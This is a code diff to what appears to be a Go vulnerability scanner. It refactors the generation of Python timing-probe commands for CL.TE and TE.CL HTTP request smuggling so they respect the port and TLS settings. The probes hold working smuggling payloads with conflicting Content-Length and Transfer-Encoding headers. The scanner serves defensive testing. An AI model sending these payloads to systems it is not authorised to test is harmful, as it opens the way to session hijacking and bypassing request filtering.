@@ -106,20 +106,7 @@ func (s *Scanner) Run(ctx context.Context, asset string, scanType module.ScanTyp
 				"uses Content-Length while the back-end uses Transfer-Encoding. An attacker can prepend " +
 				"an arbitrary HTTP request prefix to the next user's TCP stream, bypassing WAF rules, " +
 				"poisoning request routing, or hijacking authenticated sessions.",
-			ProofCommand: fmt.Sprintf(
-				"# CL.TE timing probe — connection should hang for ~%ds if vulnerable:\n"+
-					"python3 -c \"\nimport socket, ssl, time\n"+
-					"host='%s'\n"+
-					"payload=('POST / HTTP/1.1\\r\\nHost: %s\\r\\n"+
-					"Content-Type: application/x-www-form-urlencoded\\r\\n"+
-					"Content-Length: 11\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n"+
-					"0\\r\\n\\r\\nX')\n"+
-					"ctx=ssl.create_default_context()\n"+
-					"c=ctx.wrap_socket(socket.create_connection((host,443)),server_hostname=host)\n"+
-					"c.send(payload.encode()); t=time.time()\n"+
-					"try: c.recv(4096)\nexcept: pass\n"+
-					"print(f'elapsed: {time.time()-t:.1f}s (>4s = vulnerable)')\n\"",
-				int(smuggleDelay.Seconds()), asset, asset),
+			ProofCommand: clteProofCommand(asset, port, useTLS, int(smuggleDelay.Seconds())),
 			Evidence: map[string]any{
 				"type":             "CL.TE",
 				"url":              targetURL,
@@ -146,20 +133,7 @@ func (s *Scanner) Run(ctx context.Context, asset string, scanType module.ScanTyp
 			Description: "The server appears vulnerable to TE.CL request smuggling: the front-end proxy " +
 				"uses Transfer-Encoding while the back-end uses Content-Length. An attacker can smuggle " +
 				"arbitrary HTTP headers or a full request prefix into the back-end's request pipeline.",
-			ProofCommand: fmt.Sprintf(
-				"# TE.CL timing probe — connection should hang for ~%ds if vulnerable:\n"+
-					"python3 -c \"\nimport socket, ssl, time\n"+
-					"host='%s'\n"+
-					"payload=('POST / HTTP/1.1\\r\\nHost: %s\\r\\n"+
-					"Content-Type: application/x-www-form-urlencoded\\r\\n"+
-					"Content-Length: 3\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n"+
-					"1\\r\\nZ\\r\\n0\\r\\n\\r\\n')\n"+
-					"ctx=ssl.create_default_context()\n"+
-					"c=ctx.wrap_socket(socket.create_connection((host,443)),server_hostname=host)\n"+
-					"c.send(payload.encode()); t=time.time()\n"+
-					"try: c.recv(4096)\nexcept: pass\n"+
-					"print(f'elapsed: {time.time()-t:.1f}s (>4s = vulnerable)')\n\"",
-				int(smuggleDelay.Seconds()), asset, asset),
+			ProofCommand: teclProofCommand(asset, port, useTLS, int(smuggleDelay.Seconds())),
 			Evidence: map[string]any{
 				"type":             "TE.CL",
 				"url":              targetURL,
@@ -517,3 +491,48 @@ func stripScheme(s string) string {
 
 // Ensure stripScheme is used (avoids "declared and not used" if only called internally).
 var _ = stripScheme
+
+// clteProofCommand builds a Python proof-of-concept for CL.TE smuggling that
+// uses the correct port and protocol (TLS vs plain TCP).
+func clteProofCommand(asset, port string, useTLS bool, delaySec int) string {
+	connLine := fmt.Sprintf("c=socket.create_connection(('%s',%s))", asset, port)
+	if useTLS {
+		connLine = fmt.Sprintf("ctx=ssl.create_default_context()\\n"+
+			"c=ctx.wrap_socket(socket.create_connection(('%s',%s)),server_hostname='%s')",
+			asset, port, asset)
+	}
+	return fmt.Sprintf(
+		"# CL.TE timing probe — connection should hang for ~%ds if vulnerable:\n"+
+			"python3 -c \"\nimport socket, ssl, time\n"+
+			"payload=('POST / HTTP/1.1\\r\\nHost: %s\\r\\n"+
+			"Content-Type: application/x-www-form-urlencoded\\r\\n"+
+			"Content-Length: 11\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n"+
+			"0\\r\\n\\r\\nX')\n"+
+			"%s\n"+
+			"c.send(payload.encode()); t=time.time()\n"+
+			"try: c.recv(4096)\nexcept: pass\n"+
+			"print(f'elapsed: {time.time()-t:.1f}s (>4s = vulnerable)')\n\"",
+		delaySec, asset, connLine)
+}
+
+// teclProofCommand builds a Python proof-of-concept for TE.CL smuggling.
+func teclProofCommand(asset, port string, useTLS bool, delaySec int) string {
+	connLine := fmt.Sprintf("c=socket.create_connection(('%s',%s))", asset, port)
+	if useTLS {
+		connLine = fmt.Sprintf("ctx=ssl.create_default_context()\\n"+
+			"c=ctx.wrap_socket(socket.create_connection(('%s',%s)),server_hostname='%s')",
+			asset, port, asset)
+	}
+	return fmt.Sprintf(
+		"# TE.CL timing probe — connection should hang for ~%ds if vulnerable:\n"+
+			"python3 -c \"\nimport socket, ssl, time\n"+
+			"payload=('POST / HTTP/1.1\\r\\nHost: %s\\r\\n"+
+			"Content-Type: application/x-www-form-urlencoded\\r\\n"+
+			"Content-Length: 3\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n"+
+			"1\\r\\nZ\\r\\n0\\r\\n\\r\\n')\n"+
+			"%s\n"+
+			"c.send(payload.encode()); t=time.time()\n"+
+			"try: c.recv(4096)\nexcept: pass\n"+
+			"print(f'elapsed: {time.time()-t:.1f}s (>4s = vulnerable)')\n\"",
+		delaySec, asset, connLine)
+}
